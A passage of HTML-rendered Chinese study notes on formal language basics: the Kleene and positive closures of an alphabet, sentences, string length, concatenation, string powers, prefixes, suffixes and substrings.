符号表的正闭包和克林闭包</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>∑</mo><mo>+</mo></msup><mo>=</mo><mo>∑</mo><mo>∪</mo><msup><mo>∑</mo><mn>2</mn></msup><mo>∪</mo><msup><mo>∑</mo><mn>3</mn></msup><mo>∪</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\sum^{+}=\sum \cup \sum^2\cup\sum^3\cup...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.161241em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.911231em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.204018em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∪</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∪</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∪</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>∑</mo><mo>∗</mo></msup><mo>=</mo><msup><mo>∑</mo><mn>0</mn></msup><mo>+</mo><msup><mo>∑</mo><mo>+</mo></msup><mo>=</mo><msup><mo>∑</mo><mn>0</mn></msup><mo>∪</mo><mo>∑</mo><mo>∪</mo><msup><mo>∑</mo><mn>2</mn></msup><mo>∪</mo><msup><mo>∑</mo><mn>3</mn></msup><mo>∪</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\sum^{*}=\sum^0+\sum^+=\sum^0\cup\sum \cup \sum^2\cup\sum^3\cup...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.204018em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">+</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.911231em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.204018em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∪</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∪</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∪</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∪</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></p><p>感觉在集合论中接触过类似的概念，好像在关系那块。</p><p>实际上正闭包就是从1次幂到n次幂的的并集</p><p>克林闭包比正闭包更多，比正闭包多了个0次幂，实际上就是多了个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>。</p><p>比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>+</mo></msup><mo>=</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>00</mn><mo separator="true">,</mo><mn>01</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>11</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>001....</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{0,1\}^+=\{0,1,00,01,10,11,000,001....\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.021331em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mclose">}</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup><mo>=</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>00</mn><mo separator="true">,</mo><mn>01</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>11</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>001....</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{0,1\}^*=\{\epsilon,0,1,00,01,10,11,000,001....\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">ϵ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mclose">}</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>∑</mo><mo>+</mo></msup></mrow><annotation encoding="application/x-tex">\sum^+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.161241em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.911231em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span></span></span></span> 中的元素是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>中至少一个字符连接而成的字符串</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>∑</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\sum^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>中的元素是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>中的若干个，包括0个字符，连接而成的一个字符出啊</p><h3 id="句子-sentence"><a class="markdownIt-Anchor" href="#句子-sentence"></a> 句子 sentence</h3><p>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>是一个字母表，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo>∈</mo><msup><mo>∑</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\forall x\in \sum^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，x叫做<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上的一个句子。因为是从克林闭包中选择，所以一个句子可能是以恶孔子据</p><h3 id="句子的长度-length"><a class="markdownIt-Anchor" href="#句子的长度-length"></a> 句子的长度 length</h3><p>若x是一个句子，则x的长度实际就是其包含字符的个数，记作\abs{x}</p><p>长度为0的字符串叫做空句子，叫做<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>。其长度\abs{\epsilon}=0</p><p>注意区分<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span></span></span></span>的区分。</p><h3 id="并置"><a class="markdownIt-Anchor" href="#并置"></a> 并置</h3><p>实际上就是两个字符串的连接，并置又叫做连结。</p><h3 id="串x的n次幂"><a class="markdownIt-Anchor" href="#串x的n次幂"></a> 串x的n次幂</h3><p>之前讲了字母标的n次幂，是笛卡尔积。</p><p>串的x幂就很简单了，实际上就是n次连结。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>0</mn></msup><mo>=</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">x^0=\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mi>n</mi></msup><mo>=</mo><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mi>x</mi></mrow><annotation encoding="application/x-tex">x^n=x^{n-1}x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span></span></span></span></p><p>比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mn>110</mn></mrow><annotation encoding="application/x-tex">x=110</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span></span></span></span></p><p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>4</mn></msup><mo>=</mo><mn>110110110110</mn></mrow><annotation encoding="application/x-tex">x^4=110110110110</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span></span></span></span></p><h3 id="前缀与后缀"><a class="markdownIt-Anchor" href="#前缀与后缀"></a> 前缀与后缀</h3><p>设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo separator="true">,</mo><mi>w</mi><mo separator="true">,</mo><mi>v</mi><mo>∈</mo><msup><mo>∑</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">x,y,z,w,v \in \sum^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mi>y</mi><mi>z</mi></mrow><annotation encoding="application/x-tex">x=yz</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span></p><ol><li>y是x的前缀 prefix</li><li>如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>z</mi><mi mathvariant="normal">≠</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">z \ne \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span> 则y是x的真前缀 proper prefix</li><li>z是x的后缀 suffix</li><li>如果y不是空句子，则z是x的真后缀 proper suffix</li></ol><h3 id="公共前缀与后缀"><a class="markdownIt-Anchor" href="#公共前缀与后缀"></a> 公共前缀与后缀</h3><ol><li>如果x=yz, w=yv ，则y是x和w的公共前缀 common prefix</li><li>如果x和w的任何公共前缀都是y的前缀，则y是x和w的最大公共前缀。</li><li>如果x=zy, w=vy，则y是x和w的公共后缀 common suffix</li><li>如果x和w的任何公共后缀都是y的后缀，则y是x和w的最大公共后缀。</li></ol><h3 id="子串-substring"><a class="markdownIt-Anchor" href="#子串-substring"></a> 子串 substring</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo>∈</mo><msup><mo>∑</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">w, x, y, z \in \sum^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，且w=xyz，则称y是w的字串</p><h3 id="公共子串"><a class="markdownIt-Anchor" href="#公共子串"></a> 公共子串</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mo separator="true">,</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo>∈</mo><msup><mo>∑</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">t, u, v, w, x, y, z \in \sum^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop 